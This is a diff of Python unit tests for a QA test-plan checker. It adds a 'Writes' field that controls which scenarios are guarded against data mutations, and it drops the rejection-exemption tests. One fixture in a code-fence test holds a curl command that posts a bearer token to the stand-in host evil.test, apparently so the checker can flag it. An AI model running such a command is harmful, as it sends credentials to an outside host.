@@ -47,11 +47,11 @@ expect = [200]
 token = ".access_token"
 cookies = ["sessionid", "csrftoken", "__Host-session"]
 '''
-REJECTION = '''### BE-01: Reject invalid input
-- **Method:** POST /api/v1/cvs
-- **Expected:** 422 validation failure. (src/api.py:422)
+SCENARIO = '''### BE-01: List CVs
+- **Writes:** no
+- **Method:** GET /api/v1/cvs
+- **Expected:** 200 list returned. (src/api.py:200)
 - **Edge cases:**
-  - Missing field: 400. (src/api.py:400-409)
   - Invalid token: 401. (src/auth.py:401)
 '''
 
@@ -87,7 +87,7 @@ class PlanTests(unittest.TestCase):
         path.write_text(text)
         return path
 
-    def plan(self, body: str = REJECTION, *, branch: str | None = None, head: str | None = None, name: str = "test-plan.md") -> Path:
+    def plan(self, body: str = SCENARIO, *, branch: str | None = None, head: str | None = None, name: str = "test-plan.md") -> Path:
         return self.put(
             f"# Test Plan\n\n## Source\n- Branch: {branch or 'feature/profiles'}\n"
             f"- Head: {head or self.head}\n\n## BE Test Scenarios\n\n{body}",
@@ -100,7 +100,7 @@ class PlanTests(unittest.TestCase):
         self.assertEqual(config.errors, [])
         return config
 
-    def check(self, body: str = REJECTION, extra: str = "") -> dict[str, object]:
+    def check(self, body: str = SCENARIO, extra: str = "") -> dict[str, object]:
         return check_plan(parse_plan(self.plan(body)), self.config(extra))
 
     def cli(self, *args: str) -> subprocess.CompletedProcess[str]:
@@ -128,6 +128,7 @@ class PlanTests(unittest.TestCase):
         body = """## Setup
 $QA_IGNORED https://external.test
 ### BE-01: Fetch
+- **Writes:** no
 - **Method:** `GET /items`
 - **Preconditions:**
   - Read ${QA_USER_EMAIL}.
@@ -149,7 +150,7 @@ $QA_IGNORED_AGAIN https://external.test
         self.assertEqual(scenario.edges[0].statuses, [404])
 
     def test_bare_scenario_headings_do_not_consume_the_next_block(self) -> None:
-        parsed = parse_plan(self.put("### BE-01\n### BE-02\n- **Method:** GET /cvs\n- **Expected:** 200. (src/api.py:200)\n"))
+        parsed = parse_plan(self.put("### BE-01\n- **Writes:** no\n### BE-02\n- **Writes:** no\n- **Method:** GET /cvs\n- **Expected:** 200. (src/api.py:200)\n"))
         self.assertEqual([scenario.id for scenario in parsed.scenarios], ["BE-01", "BE-02"])
         self.assertEqual([scenario.title for scenario in parsed.scenarios], ["", ""])
         self.assertEqual(parsed.scenarios[1].path, "/cvs")
@@ -158,6 +159,7 @@ $QA_IGNORED_AGAIN https://external.test
         for fence in ("```", "~~~"):
             with self.subTest(fence=fence):
                 body = f"""### BE-01: Send request
+- **Writes:** no
 - **Method:** GET /cvs
 - **Steps:**
 {fence}bash
@@ -168,6 +170,7 @@ curl -X POST http://evil.test/x -H "Authorization: Bearer $QA_NOPE_TOKEN"
 - **Expected:** 400 invalid request. (src/api.py:400)
 - **DB Check:** `SELECT COUNT(id) FROM cvs`
 ### BE-02: Fetch
+- **Writes:** no
 - **Method:** GET /cvs
 - **Expected:** 200 with an id. (src/api.py:200)
 """
@@ -262,7 +265,7 @@ password = "literal:postgres"
             with self.subTest(head=head):
                 self.plan(head=head)
                 self.assertEqual(resolve_plan(self.repo)["action"], "stale")
-        self.put("## Source\n- Branch: feature/profiles\n\n" + REJECTION)
+        self.put("## Source\n- Branch: feature/profiles\n\n" + SCENARIO)
         self.assertEqual(resolve_plan(self.repo)["action"], "stale")
 
     def test_resolve_explicit_path_reuses_even_a_stale_other_branch_plan(self) -> None:
@@ -272,9 +275,9 @@ password = "literal:postgres"
         self.assertEqual(result["plan"], "docs/testing/plans/test-plan.md")
 
     def test_persona_token_takes_precedence_over_value_and_falls_back_to_value(self) -> None:
-        body = REJECTION + "- **Headers:** Authorization: $QA_API_TOKEN\n"
+        body = SCENARIO + "- **Headers:** Authorization: $QA_API_TOKEN\n"
         cases = (
-            (ACCOUNTS.replace('["user", "other"]', '["api"]'), ["api"], []),
+            ('mutations="allow"\n' + ACCOUNTS.replace('["user", "other"]', '["api"]'), ["api"], []),
             ('[env.values]\nAPI_TOKEN = "literal:public"\n', [], ["API_TOKEN"]),
         )
         for extra, personas, values in cases:
@@ -294,7 +297,7 @@ password = "literal:postgres"
         for token in ("$QA_USER_TOKEN", "${QA_USER_TOKEN}"):
             for placement in placements:
                 with self.subTest(token=token, placement=placement):
-                    result = self.check(REJECTION + placement.format(token=token), ACCOUNTS)
+                    result = self.check(SCENARIO + placement.format(token=token), 'mutations="allow"\n' + ACCOUNTS)
                     self.assertEqual(result["personas"], ["user"])
                     self.assertEqual(result["missing"]["personas"], [])
 
@@ -305,7 +308,7 @@ password = "literal:postgres"
             ("$QA_FOO", "values", "FOO"),
         ):
             with self.subTest(token=token):
-                result = self.check(REJECTION + f"- **Headers:** {token}\n")
+                result = self.check(SCENARIO + f"- **Headers:** {token}\n")
                 self.assertFalse(result["ok"])
                 missing = result["missing"][category]
                 self.assertEqual(missing[0]["name"] if category == "personas" else missing[0], name)
@@ -314,8 +317,8 @@ password = "literal:postgres"
 
     def test_persona_names_with_underscores_and_normalized_cookie_names(self) -> None:
         accounts = ACCOUNTS.replace('["user", "other"]', '["power_user"]')
-        body = REJECTION + "- **Headers:** ${QA_POWER_USER_COOKIE_HOST_SESSION}\n"
-        result = self.check(body, accounts)
+        body = SCENARIO + "- **Headers:** ${QA_POWER_USER_COOKIE_HOST_SESSION}\n"
+        result = self.check(body, 'mutations="allow"\n' + accounts)
         self.assertTrue(result["ok"], result)
         self.assertEqual(result["personas"], ["power_user"])
 
@@ -326,15 +329,15 @@ password = "literal:postgres"
             ("QA_USER_ID", ACCOUNTS.replace('id = ".id"\n', ""), "ID"),
         ):
             with self.subTest(token=token):
-                result = self.check(REJECTION + f"- **Headers:** ${token}\n", extra)
+                result = self.check(SCENARIO + f"- **Headers:** ${token}\n", 'mutations="allow"\n' + extra)
                 gap = result["missing"]["personas"][0]
                 self.assertEqual((gap["name"], gap["token"]), ("user", token))
                 self.assertIn(reason, gap["reason"])
 
     def test_provisioning_requires_create_and_cannot_run_under_deny(self) -> None:
-        body = REJECTION + "- **Headers:** $QA_USER_EMAIL\n"
+        body = SCENARIO + "- **Headers:** $QA_USER_EMAIL\n"
         for extra, reason in (
-            ('[qa.accounts]\npersonas=["user"]\n', "create"),
+            ('mutations="allow"\n[qa.accounts]\npersonas=["user"]\n', "create"),
             ('mutations="deny"\n' + ACCOUNTS, "deny"),
         ):
             with self.subTest(reason=reason):
@@ -348,7 +351,7 @@ email = "env:QA_ADMIN_EMAIL"
 password = "env:QA_ADMIN_PASSWORD"
 id = "env:QA_ADMIN_ID"
 '''
-        result = self.check(REJECTION + "- **Headers:** $QA_ADMIN_EMAIL $QA_ADMIN_ID\n", extra)
+        result = self.check(SCENARIO + "- **Headers:** $QA_ADMIN_EMAIL $QA_ADMIN_ID\n", extra)
         self.assertEqual(result["missing"]["personas"], [])
         self.assertEqual(result["personas"], ["admin"])
 
@@ -364,27 +367,27 @@ kind = "command"
 run = "login-user"
 outputs = {token = true, cookies = ["sessionid"]}
 '''
-        result = self.check(REJECTION + "- **Headers:** $QA_USER_ID $QA_USER_TOKEN $QA_USER_COOKIE_SESSIONID\n", extra)
+        result = self.check(SCENARIO + "- **Headers:** $QA_USER_ID $QA_USER_TOKEN $QA_USER_COOKIE_SESSIONID\n", 'mutations="allow"\n' + extra)
         self.assertEqual(result["missing"]["personas"], [])
 
     def test_missing_target_default_and_database_are_config_gaps(self) -> None:
-        result = self.check(REJECTION + '- **Target:** absent\n- **DB Check:** `SELECT COUNT(id) FROM cvs`\n')
+        result = self.check(SCENARIO + '- **Target:** absent\n- **DB Check:** `SELECT COUNT(id) FROM cvs`\n')
         self.assertEqual(result["missing"]["targets"], ["absent"])
         self.assertTrue(result["missing"]["database"])
         self.assertEqual(result["db_checks"], ["BE-01"])
         self.put('version=1\n[env.targets]\napp="http://localhost:8000"\nsupabase="http://127.0.0.1:54321"\n[qa]\n', ".av/config.toml")
         for section, body, target in (
-            ("BE", REJECTION, "backend"),
-            ("FE", "### FE-01: Display items\n- **URL:** /items\n- **Expected:** Items are visible. (src/ui.ts:1)\n", "ui"),
+            ("BE", SCENARIO, "backend"),
+            ("FE", "### FE-01: Display items\n- **Writes:** no\n- **URL:** /items\n- **Expected:** Items are visible. (src/ui.ts:1)\n", "ui"),
         ):
             with self.subTest(section=section):
                 result = check_plan(parse_plan(self.plan(body)), Config(self.repo, state_home=self.state))
                 self.assertEqual(result["missing"]["targets"], [target])
 
-    def test_section_targets_follow_reserved_names(self) -> None:
+    def test_section_targets_require_reserved_names_or_a_single_target(self) -> None:
         plan = parse_plan(self.plan(
-            "### FE-01: Display items\n- **URL:** /items\n- **Expected:** Items are visible. (src/ui.ts:1)\n"
-            "### BE-01: List items\n- **Method:** GET /items\n- **Expected:** 200. (src/app.py:1)\n"
+            "### FE-01: Display items\n- **Writes:** no\n- **URL:** /items\n- **Expected:** Items are visible. (src/ui.ts:1)\n"
+            "### BE-01: List items\n- **Writes:** no\n- **Method:** GET /items\n- **Expected:** 200. (src/app.py:1)\n"
         ))
         cases = (
             (("backend", "ui"), [], {"FE": "ui", "BE": "backend"}),
@@ -392,7 +395,8 @@ outputs = {token = true, cookies = ["sessionid"]}
             (("backend",), [], {"FE": "backend", "BE": "backend"}),
             (("app",), [], {"FE": "app", "BE": "app"}),
             (("app", "other"), ["backend", "ui"], {"FE": None, "BE": None}),
-            (("ui", "supabase"), [], {"FE": "ui", "BE": "ui"}),
+            (("ui", "supabase"), ["backend"], {"FE": "ui", "BE": None}),
+            (("backend", "supabase"), ["ui"], {"FE": None, "BE": "backend"}),
         )
         for names, missing, defaults in cases:
             with self.subTest(targets=names):
@@ -405,7 +409,7 @@ outputs = {token = true, cookies = ["sessionid"]}
 
     def test_absolute_url_does_not_need_default_target(self) -> None:
         self.put('version=1\n[env.targets]\napp="http://localhost:8000"\nother="http://localhost:9000"\n[qa]\n', ".av/config.toml")
-        plan = parse_plan(self.plan(REJECTION.replace("/api/v1/cvs", "http://localhost:8000/api/v1/cvs")))
+        plan = parse_plan(self.plan(SCENARIO.replace("/api/v1/cvs", "http://localhost:8000/api/v1/cvs")))
         result = check_plan(plan, Config(self.repo, state_home=self.state))
         self.assertEqual(result["missing"]["targets"], [])
 
@@ -417,7 +421,7 @@ outputs = {token = true, cookies = ["sessionid"]}
             "- **Steps:** Open http://secret:password@localhost:8000/cvs\n",
         ):
             with self.subTest(line=line):
-                result = self.check(REJECTION + line)
+                result = self.check(SCENARIO + line)
                 self.assertFalse(result["ok"])
                 self.assertEqual(result["off_target"][0]["scenario"], "BE-01")
                 self.assertNotIn("password", json.dumps(result))
@@ -425,34 +429,13 @@ outputs = {token = true, cookies = ["sessionid"]}
 
     def test_exact_origin_matches_default_port_and_case_normalized_host(self) -> None:
         self.put('version=1\n[env.targets]\nbackend="http://localhost"\n[qa]\n', ".av/config.toml")
-        plan = parse_plan(self.plan(REJECTION.replace("/api/v1/cvs", "http://LOCALHOST:80/cvs")))
+        plan = parse_plan(self.plan(SCENARIO.replace("/api/v1/cvs", "http://LOCALHOST:80/cvs")))
         result = check_plan(plan, Config(self.repo, state_home=self.state))
         self.assertEqual(result["off_target"], [])
 
-    def test_rejection_exemption_requires_every_clause(self) -> None:
-        cases = (
-            (REJECTION, [], ["BE-01"]),
-            (REJECTION.replace("Missing field: 400", "Missing field: 200"), ["BE-01"], []),
-            (REJECTION.replace("422 validation", "422 or 409 validation"), ["BE-01"], []),
-            (REJECTION.replace("422 validation", "validation"), ["BE-01"], []),
-            (REJECTION.replace("401.", "401. (unverified — confirm at run time)"), ["BE-01"], []),
-            (REJECTION.replace("422 validation failure. (src/api.py:422)", "422. (unverified — confirm at run time)"), ["BE-01"], []),
-            (REJECTION + '- **DB Check:** `DELETE FROM cvs WHERE id = 1`\n', ["BE-01"], []),
-            (REJECTION + '- **DB Check:** `SELECT COUNT(id) FROM cvs`\n', [], ["BE-01"]),
-            (REJECTION + '- **Preconditions:** POST /cvs to obtain an id.\n', ["BE-01"], []),
-            (REJECTION + '- **Preconditions:** Create a CV before testing.\n', ["BE-01"], []),
-            (REJECTION + '- **Steps:**\n  1. Seed the test table.\n', ["BE-01"], []),
-            (REJECTION + '- **Cleanup:** DELETE /cvs/1\n', ["BE-01"], []),
-            (REJECTION + '- **Precondition:** POST /cvs\n', ["BE-01"], []),
-        )
-        for body, guarded, exempt in cases:
-            with self.subTest(body=body):
-                result = self.check(body)
-                self.assertEqual(result["guarded"], guarded)
-                self.assertEqual(result["exempt"], exempt)
-
-    def test_period_after_expected_status_preserves_assertion_and_exemption(self) -> None:
+    def test_period_after_expected_status_preserves_assertion(self) -> None:
         body = """### BE-01: Reject deletion
+- **Writes:** no
 - **Method:** DELETE /cvs/1
 - **Expected:** 404. (src/api.py:404)
 - **Edge cases:**
@@ -461,19 +444,18 @@ outputs = {token = true, cookies = ["sessionid"]}
         parsed = parse_plan(self.plan(body))
         self.assertEqual(parsed.scenarios[0].expected.statuses, [404])
         result = check_plan(parsed, self.config())
-        self.assertEqual(result["guarded"], [])
-        self.assertEqual(result["exempt"], ["BE-01"])
+        self.assertEqual(result["guarded"], ["BE-01"])
 
     def test_readonly_expected_write_word_is_not_an_action(self) -> None:
         body = """### BE-01: Fetch
+- **Writes:** no
 - **Method:** GET /cvs
 - **Expected:** 200. The Delete button payload is absent (src/api.py:10)
 """
         result = self.check(body)
         self.assertEqual(result["guarded"], [])
-        self.assertEqual(result["exempt"], [])
 
-    def test_rejection_edges_headers_and_payload_are_not_other_write_steps(self) -> None:
+    def test_write_methods_remain_guarded_with_assertions_headers_and_payload(self) -> None:
         cases = (
             ("DELETE", "  - DELETE as another persona: 403. (src/api.py:403)\n"),
             ("PATCH", "  - PATCH without token: 401. (src/api.py:401)\n"),
@@ -483,54 +465,74 @@ outputs = {token = true, cookies = ["sessionid"]}
         )
         for method, field in cases:
             with self.subTest(method=method, field=field):
-                body = REJECTION.replace("POST /api/v1/cvs", f"{method} /api/v1/cvs") + field
-                result = self.check(body)
-                self.assertEqual(result["guarded"], [])
-                self.assertEqual(result["exempt"], ["BE-01"])
+                body = SCENARIO.replace("GET /api/v1/cvs", f"{method} /api/v1/cvs") + field
+                self.assertEqual(self.check(body, 'mutations="deny"\n')["guarded"], ["BE-01"])
 
     def test_unlabelled_write_bullets_cannot_bypass_mutation_guards(self) -> None:
         for preceding in ("method", "expected"):
             with self.subTest(preceding=preceding):
-                body = REJECTION
-                anchor = "- **Method:** POST /api/v1/cvs" if preceding == "method" else "- **Expected:** 422 validation failure. (src/api.py:422)"
+                body = SCENARIO
+                anchor = "- **Method:** GET /api/v1/cvs" if preceding == "method" else "- **Expected:** 200 list returned. (src/api.py:200)"
                 body = body.replace(anchor, anchor + "\n- Seed a resource with POST /cvs before this test.")
-                result = self.check(body)
+                result = self.check(body, 'mutations="deny"\n')
                 self.assertEqual(result["guarded"], ["BE-01"])
-                self.assertEqual(result["exempt"], [])
-        body = "### BE-01: Fetch\n- POST /cvs to create the resource.\n- **Method:** GET /cvs/1\n- **Expected:** 200. (src/api.py:200)\n"
+        body = "### BE-01: Fetch\n- **Writes:** no\n- POST /cvs to create the resource.\n- **Method:** GET /cvs/1\n- **Expected:** 200. (src/api.py:200)\n"
         result = self.check(body, 'mutations="deny"\n')
         self.assertEqual(result["guarded"], ["BE-01"])
 
     def test_deny_guards_writes_in_methods_preconditions_steps_edges_and_db(self) -> None:
         for body in (
-            REJECTION,
-            REJECTION.replace("POST /api/v1/cvs", "GET /api/v1/cvs") + "- **Preconditions:** POST /cvs creates the resource.\n",
-            REJECTION.replace("POST /api/v1/cvs", "GET /api/v1/cvs") + "- **Steps:**\n  1. PATCH /cvs/1\n",
-            REJECTION.replace("POST /api/v1/cvs", "GET /api/v1/cvs").replace("Missing field: 400", "DELETE /cvs/1: 400"),
-            REJECTION.replace("POST /api/v1/cvs", "GET /api/v1/cvs") + '- **DB Check:** `UPDATE cvs SET title = 1`\n',
+            SCENARIO.replace("GET", "POST"),
+            SCENARIO + "- **Preconditions:** POST /cvs creates the resource.\n",
+            SCENARIO + "- **Steps:**\n  1. PATCH /cvs/1\n",
+            SCENARIO.replace("Invalid token: 401", "DELETE /cvs/1: 400"),
+            SCENARIO + '- **DB Check:** `UPDATE cvs SET title = 1`\n',
         ):
             with self.subTest(body=body):
                 result = self.check(body, 'mutations="deny"\n')
                 self.assertEqual(result["guarded"], ["BE-01"])
-                self.assertEqual(result["exempt"], [])
 
-    def test_fe_has_no_rejection_exemption_and_only_literal_verb_detection(self) -> None:
+    def test_fe_syntactic_guard_uses_literal_verbs(self) -> None:
         for verb, guarded in (("POST", ["FE-01"]), ("post", ["FE-01"]), ("Click Save", [])):
             with self.subTest(verb=verb):
-                body = f"### FE-01: UI\n- **Steps:** {verb} /cvs\n- **Expected:** 422. (src/ui.ts:422)\n"
+                body = f"### FE-01: UI\n- **Writes:** no\n- **Steps:** {verb} /cvs\n- **Expected:** 422. (src/ui.ts:422)\n"
                 result = self.check(body)
                 self.assertEqual(result["guarded"], guarded)
-                self.assertEqual(result["exempt"], [])
 
     def test_readonly_scenarios_are_not_guarded(self) -> None:
-        for policy in ("deny", "rejections-only", "allow"):
+        for policy in ("deny", "allow"):
             with self.subTest(policy=policy):
                 result = self.check(
-                    REJECTION.replace("POST /api/v1/cvs", "GET /api/v1/cvs"),
+                    SCENARIO,
                     f'mutations="{policy}"\n',
                 )
                 self.assertEqual(result["guarded"], [])
-                self.assertEqual(result["exempt"], [])
+
+    def test_writes_line_drives_guards_under_deny(self) -> None:
+        body = (
+            "### BE-01: Explicit write\n- **Writes:** yes\n- **Method:** GET /items\n"
+            "### BE-02: Read\n- **Writes:** no\n- **Method:** GET /items\n"
+            "### BE-03: Unspecified\n- **Method:** GET /items\n"
+            "### BE-04: Hidden write\n- **Writes:** no\n- **Method:** POST /items\n"
+        )
+        result = self.check(body, 'mutations="deny"\n')
+        self.assertEqual(result["guarded"], ["BE-01", "BE-03", "BE-04"])
+        self.assertNotIn("exempt", result)
+
+    def test_allow_guards_nothing(self) -> None:
+        body = (
+            "### BE-01: Explicit write\n- **Writes:** yes\n- **Method:** GET /items\n"
+            "### BE-02: Read\n- **Writes:** no\n- **Method:** GET /items\n"
+            "### BE-03: Unspecified\n- **Method:** GET /items\n"
+            "### BE-04: Hidden write\n- **Writes:** no\n- **Method:** POST /items\n"
+        )
+        self.assertEqual(self.check(body, 'mutations="allow"\n')["guarded"], [])
+
+    def test_writes_line_is_case_insensitive_and_unknown_values_fail_closed(self) -> None:
+        for value, guarded in (("NO", []), (" YES ", ["BE-01"]), ("maybe", ["BE-01"]), ("", ["BE-01"])):
+            with self.subTest(value=value):
+                body = SCENARIO.replace("Writes:** no", f"Writes:** {value}")
+                self.assertEqual(self.check(body, 'mutations="deny"\n')["guarded"], guarded)
 
     def test_cli_resolve_and_check_report_json_and_domain_stops(self) -> None:
         path = self.plan()
@@ -540,7 +542,7 @@ outputs = {token = true, cookies = ["sessionid"]}
         checked = self.cli("plan", "check", str(path))
         self.assertEqual(checked.returncode, 0, checked.stderr)
         self.assertTrue(json.loads(checked.stdout)["ok"])
-        self.plan(REJECTION + "- **Headers:** $QA_UNKNOWN_TOKEN\n")
+        self.plan(SCENARIO + "- **Headers:** $QA_UNKNOWN_TOKEN\n")
         checked = self.cli("plan", "check", str(path))
         self.assertEqual(checked.returncode, 1, checked.stderr)
         self.assertFalse(json.loads(checked.stdout)["ok"])
